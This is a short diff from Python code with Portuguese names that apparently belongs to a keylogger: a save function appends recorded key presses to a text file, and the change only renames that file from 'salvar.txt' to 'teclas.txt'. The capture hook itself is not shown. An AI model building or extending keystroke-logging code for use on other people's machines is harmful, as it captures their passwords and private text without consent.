@@ -15,7 +15,7 @@ def pressionar_tecla(tecla):
         teclas_pressionadas = []
 
 def salvar(teclas):
-    with open("salvar.txt", "a") as arquivo:
+    with open("teclas.txt", "a") as arquivo:
         arquivo.write('\n')
         for tecla in teclas:
             tecla = str(tecla).replace("'", "")
